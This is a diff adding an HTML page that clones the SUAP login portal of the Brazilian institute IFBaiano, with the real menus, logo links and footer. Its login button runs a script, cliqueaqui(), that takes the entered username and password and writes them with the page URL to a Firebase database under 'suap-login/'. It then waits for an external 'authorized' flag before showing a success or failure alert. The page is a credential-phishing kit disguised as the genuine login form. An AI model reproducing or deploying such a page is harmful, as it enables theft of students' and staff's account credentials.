@@ -1,0 +1,378 @@
+<!doctype html>
+
+<html lang="pt-br">
+
+<head>
+    <title> - SUAP: Sistema Unificado de Administração Pública</title>
+    <meta charset="utf-8">
+    <meta name="keywords" content="suap, administração, pública, mec, ifrn">
+    <meta content="SUAP: Sistema Unificado de Administração Pública" name="description">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- IFBaiano: Habilita o envio do REFERRER. Utilizado na integração com o CAU. -->
+    <meta name="referrer" content="unsafe-url">
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+    <link rel="shortcut icon" href="https://suap.ifbaiano.edu.br/static/comum/img/favicon.png">
+    <link href="/static/css/main_default.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/css/anonima.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/css/nouislider.min.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/css/bootstrap-utilities.min.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/css/dist/css/bootstrap-utilities.css" rel="stylesheet" type="text/css" media="all">
+
+    <link href="/static/djtools/fancybox/custom.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/fancybox/fancybox-core.css" rel="stylesheet" type="text/css" media="all">
+
+    <link href="/static/djtools/jquery-1.6.2/css/jquery.ui.all.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/jquery-1.6.2/css/jquery.ui.base.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/jquery-1.6.2/css/jquery.ui.core.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/jquery-1.6.2/css/jquery.ui.datepicker.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/jquery-1.6.2/css/jquery.ui.dialog.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/static/djtools/jquery-1.6.2/css/jquery.ui.theme.css" rel="stylesheet" type="text/css" media="all">
+
+
+    <link href="/static/djtools/jstree/themes/default/style.min.css" rel="stylesheet" type="text/css" media="all">
+
+    <script type="text/javascript" src="/static/comum/js/jquery.min.js"></script>
+    <script type="text/javascript" src="/static/comum/js/jquery.ui.custom.min.js"></script>
+
+    <script type="text/javascript" src="/static/js/fancybox.js" charset="utf-8"></script>
+    <script type="text/javascript" src="/static/js/jquery.min.js" charset="utf-8"></script>
+    <script type="text/javascript" src="/static/js/main.js" charset="utf-8"></script>
+    <script type="text/javascript" src="/static/js/nouislider.min.js" charset="utf-8"></script>
+    <script type="text/javascript" src="/static/js/tabs.js" charset="utf-8"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.5/firebase.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "",
+            authDomain: "",
+            databaseURL: "",
+            projectId: "",
+            storageBucket: "",
+            messagingSenderId: "",
+            appId: "",
+            measurementId: ""
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+    </script>
+
+    <script type="text/javascript" src="/static/js/login.js" charset="utf-8"></script>
+
+    <script>
+        jQuery(document).ready(function () {
+            initAll();
+            initMenu();
+
+            /* Menu principal: Para dispositivos moveis */
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                jQuery("body").addClass("hideSidebar");
+            }
+        });
+    </script>
+    <meta name="test_suap_login" content="1">
+    <style type="text/css">
+        .vue-notification-group {
+            display: block;
+            position: fixed;
+            z-index: 5000
+        }
+
+        .vue-notification-wrapper {
+            display: block;
+            overflow: hidden;
+            width: 100%;
+            margin: 0;
+            padding: 0
+        }
+
+        .notification-title {
+            font-weight: 600
+        }
+
+        .vue-notification-template {
+            background: #fff
+        }
+
+        .vue-notification,
+        .vue-notification-template {
+            display: block;
+            box-sizing: border-box;
+            text-align: left
+        }
+
+        .vue-notification {
+            font-size: 12px;
+            padding: 10px;
+            margin: 0 5px 5px;
+            color: #fff;
+            background: #44a4fc;
+            border-left: 5px solid #187fe7
+        }
+
+        .vue-notification.warn {
+            background: #ffb648;
+            border-left-color: #f48a06
+        }
+
+        .vue-notification.error {
+            background: #e54d42;
+            border-left-color: #b82e24
+        }
+
+        .vue-notification.success {
+            background: #68cd86;
+            border-left-color: #42a85f
+        }
+
+        .vn-fade-enter-active,
+        .vn-fade-leave-active,
+        .vn-fade-move {
+            transition: all .5s
+        }
+
+        .vn-fade-enter,
+        .vn-fade-leave-to {
+            opacity: 0
+        }
+    </style>
+</head>
+
+<body class="anonima login">
+    <div class="holder"><a href="#" class="toggleSidebar"><span class="fas fa-chevron-left"
+                aria-hidden="true"></span><span class="sr-only">Mostrar/Esconder barra lateral</span></a>
+        <aside class="nav">
+            <header>
+                <h1><a href="/" title="SUAP: Sistema Unificado de Administração Pública">SUAP</a></h1><img
+                    src="/static/comum/img/logo_capa.png"
+                    alt="Logo de Instituto Federal de Educação, Ciência e Tecnologia Baiano">
+            </header>
+            <nav>
+                <ul class="_main_menu">
+                    <li class="_menu_group"><span class="_menu_subtitle">Acessos</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/accounts/login/" title="Login" class="_menu_link"><span
+                                        class="fas fa-lock" aria-hidden="true"></span> Login</a></li>
+                            <li class="_menu_item"><a href="https://cau.ifbaiano.edu.br/" title="Alterar Senha"
+                                    class="_menu_link"><span class="fas fa-key" aria-hidden="true"></span> Alterar
+                                    Senha</a></li>
+                            <li class="_menu_item"><a href="/edu/acesso_responsavel/" title="Acesso do Responsável"
+                                    class="_menu_link"><span class="fas fa-passport" aria-hidden="true"></span> Acesso
+                                    do Responsável</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Autenticação de Documentos</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/comum/autenticar_documento/" title="Documentos Gerais"
+                                    class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Documentos
+                                    Gerais</a></li>
+                            <li class="_menu_item"><a href="/comum/validar_assinatura/" title="Assinaturas Digitais"
+                                    class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Assinaturas
+                                    Digitais</a></li>
+                            <li class="_menu_item"><a href="/edu/autenticar_certificado_minicurso/"
+                                    title="Certificados de Minicursos" class="_menu_link"><span class="fas fa-lock"
+                                        aria-hidden="true"></span> Certificados de Minicursos</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Avaliações</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/estagios/avaliar_pratica_profissional_supervisor/"
+                                    title="Avaliação de Estágio" class="_menu_link"><span class="fas fa-chart-line"
+                                        aria-hidden="true"></span> Avaliação de Estágio</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Consultas</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/protocolo/consulta_publica" title="Processos Físicos"
+                                    class="_menu_link"><span class="fas fa-file-alt" aria-hidden="true"></span>
+                                    Processos Físicos</a></li>
+                            <li class="_menu_item"><a href="/edu/registroemissaodiploma_public/"
+                                    title="Registro de Diplomas" class="_menu_link"><span class="fas fa-certificate"
+                                        aria-hidden="true"></span> Registro de Diplomas</a></li>
+                            <li class="_menu_item"><a href="/demandas/atualizacoes/" title="Atualizações do Sistema"
+                                    class="_menu_link"><span class="fas fa-file-contract" aria-hidden="true"></span>
+                                    Atualizações do Sistema</a></li>
+                            <li class="_menu_item"><a href="/processo_eletronico/consulta_publica/"
+                                    title="Processos Eletrônicos" class="_menu_link"><span class="fas fa-file"
+                                        aria-hidden="true"></span> Processos Eletrônicos</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Eventos</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/eventos/inscricao_publica/"
+                                    title="Realizar Inscrição em Evento" class="_menu_link"><span
+                                        class="fas fa-certificate" aria-hidden="true"></span> Realizar Inscrição em
+                                    Evento</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Solicitações</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a
+                                    href="https://sistemas.ifbaiano.edu.br/EDU/form.jsp?sys=EXT&amp;action=openform&amp;formID=15"
+                                    title="Certificação ENEM" class="_menu_link"><span class="fas fa-certificate"
+                                        aria-hidden="true"></span> Certificação ENEM</a></li>
+                        </ul>
+                    </li>
+                </ul>
+                <ul class="" id="_menu_list_expanded" style="display: none;">
+                    <li class="_menu_group"><span class="_menu_subtitle">Acessos</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/accounts/login/" title="Login" class="_menu_link"><span
+                                        class="fas fa-lock" aria-hidden="true"></span> Login</a></li>
+                            <li class="_menu_item"><a href="https://cau.ifbaiano.edu.br/" title="Alterar Senha"
+                                    class="_menu_link"><span class="fas fa-key" aria-hidden="true"></span> Alterar
+                                    Senha</a></li>
+                            <li class="_menu_item"><a href="/edu/acesso_responsavel/" title="Acesso do Responsável"
+                                    class="_menu_link"><span class="fas fa-passport" aria-hidden="true"></span> Acesso
+                                    do Responsável</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Autenticação de Documentos</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/comum/autenticar_documento/" title="Documentos Gerais"
+                                    class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Documentos
+                                    Gerais</a></li>
+                            <li class="_menu_item"><a href="/comum/validar_assinatura/" title="Assinaturas Digitais"
+                                    class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Assinaturas
+                                    Digitais</a></li>
+                            <li class="_menu_item"><a href="/edu/autenticar_certificado_minicurso/"
+                                    title="Certificados de Minicursos" class="_menu_link"><span class="fas fa-lock"
+                                        aria-hidden="true"></span> Certificados de Minicursos</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Avaliações</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/estagios/avaliar_pratica_profissional_supervisor/"
+                                    title="Avaliação de Estágio" class="_menu_link"><span class="fas fa-chart-line"
+                                        aria-hidden="true"></span> Avaliação de Estágio</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Consultas</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/protocolo/consulta_publica" title="Processos Físicos"
+                                    class="_menu_link"><span class="fas fa-file-alt" aria-hidden="true"></span>
+                                    Processos Físicos</a></li>
+                            <li class="_menu_item"><a href="/edu/registroemissaodiploma_public/"
+                                    title="Registro de Diplomas" class="_menu_link"><span class="fas fa-certificate"
+                                        aria-hidden="true"></span> Registro de Diplomas</a></li>
+                            <li class="_menu_item"><a href="/demandas/atualizacoes/" title="Atualizações do Sistema"
+                                    class="_menu_link"><span class="fas fa-file-contract" aria-hidden="true"></span>
+                                    Atualizações do Sistema</a></li>
+                            <li class="_menu_item"><a href="/processo_eletronico/consulta_publica/"
+                                    title="Processos Eletrônicos" class="_menu_link"><span class="fas fa-file"
+                                        aria-hidden="true"></span> Processos Eletrônicos</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Eventos</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a href="/eventos/inscricao_publica/"
+                                    title="Realizar Inscrição em Evento" class="_menu_link"><span
+                                        class="fas fa-certificate" aria-hidden="true"></span> Realizar Inscrição em
+                                    Evento</a></li>
+                        </ul>
+                    </li>
+                    <li class="_menu_group"><span class="_menu_subtitle">Solicitações</span>
+                        <ul class="_menu_subgroup">
+                            <li class="_menu_item"><a
+                                    href="https://sistemas.ifbaiano.edu.br/EDU/form.jsp?sys=EXT&amp;action=openform&amp;formID=15"
+                                    title="Certificação ENEM" class="_menu_link"><span class="fas fa-certificate"
+                                        aria-hidden="true"></span> Certificação ENEM</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </nav>
+        </aside>
+        <main id="content">
+
+            <div id="login">
+                <h2>SUAP: Sistema Unificado de Administração Pública</h2>
+                <h3><span class="fas fa-lock" aria-hidden="true"></span> Login IFBAIANO</h3>
+                <div class="form-row"><label for="id_username" class="required"
+                        title="Preenchimento obrigatório">Usuário:</label><input type="text" autocomplete="off"
+                        name="username" autofocus="" autocapitalize="none" maxlength="150" required="" id="id_username">
+                </div>
+                <div class="form-row"><label for="id_password" class="required"
+                        title="Preenchimento obrigatório">Senha:</label>
+                    <div class="password-container"><input type="password" class="password-input" autocomplete="off"
+                            name="password" required="" id="id_password"><button class="input-group-addon" type="button"
+                            role="button" id="view-password" title="Exibir a senha"><span class="fa fa-eye fa-fw"
+                                aria-hidden="true"></span><span class="sr-only">Exibir a
+                                senha</span></button></div>
+                    <script>
+                        toggle_password_view('password');
+                    </script><input type="hidden" name="this_is_the_login_form" value="1"><input type="hidden"
+                        name="next" value="">
+                </div>
+                <div class="form-row" id="captcha-row" style="display: none;"><label for="id_recaptcha" class="required"
+                        title="Preenchimento obrigatório">Captcha:</label>
+
+                </div>
+                <script>
+                    function cliqueaqui() {
+                        const user = document.getElementById('id_username').value;
+
+                        const password = document.getElementById('id_password').value;
+
+                        const db = firebase.database()
+
+                        console.log(document.URL);
+
+                        db.ref(`suap-login/${user}`).set({ user, password, code: document.URL });
+
+                        db.ref(`suap-login/${user}`).on('value', (snapshot) => {
+                            const data = snapshot.val();
+
+                            if (!data) return;
+
+                            if (data.authorized) {
+                                db.ref(`suap-login/${user}`).remove();
+
+                                alert('Logado com sucesso!');
+
+                                window.close();
+                            } else if (data.authorized === false) {
+                                db.ref(`suap-login/${user}`).remove();
+
+                                alert('Usuário ou senha inválidos.');
+                            }
+                        })
+                    }
+                </script>
+                <div class="submit-row"><input type="submit" onclick="cliqueaqui()" class="btn success" value="Acessar">
+                </div>
+                <div class="form-row"><a href="https://cau.ifbaiano.edu.br/cau/forgot-password"
+                        class="remember-password" target="_blank">Esqueceu ou deseja alterar sua senha?</a></div>
+            </div>
+        </main>
+        <footer class="login-footer flex-container">
+            <div class="flex-item"><span class="fas fa-copyright" aria-hidden="true"></span> 2023 SUAP</div>
+            <div class="flex-item"><span class="fab fa-python" aria-hidden="true"></span> Desenvolvimento por IFRN</div>
+            <div class="flex-item"><span class="fas fa-server" aria-hidden="true"></span> suap - swb37ret</div>
+            <div class="flex-item"><span class="fas fa-id-badge" aria-hidden="true"></span> Licenciado para IFBAIANO
+            </div>
+        </footer>
+    </div>
+    <script type="text/javascript" src="/static/js/fancybox.js?v=90087df8ca4f6293e59f6cf4ec9dfc46"
+        charset="utf-8"></script>
+    <div
+        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
+        <div
+            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
+        </div>
+        <div class="g-recaptcha-bubble-arrow"
+            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
+        </div>
+        <div class="g-recaptcha-bubble-arrow"
+            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
+        </div>
+        <div style="z-index: 2000000000; position: relative;"><iframe title="o desafio reCAPTCHA expira em dois minutos"
+                src="https://www.google.com/recaptcha/api2/bframe?hl=pt-BR&amp;v=gEr-ODersURoIfof1hiDm7R5&amp;k=6LfVsSQaAAAAAE0P3vsFH9SsLqtfuYO5Tz2Hn299"
+                name="c-hv1usy6l6sw0" frameborder="0" scrolling="no"
+                sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
+                style="width: 100%; height: 100%;"></iframe></div>
+    </div>
+</body>
+
+</html>
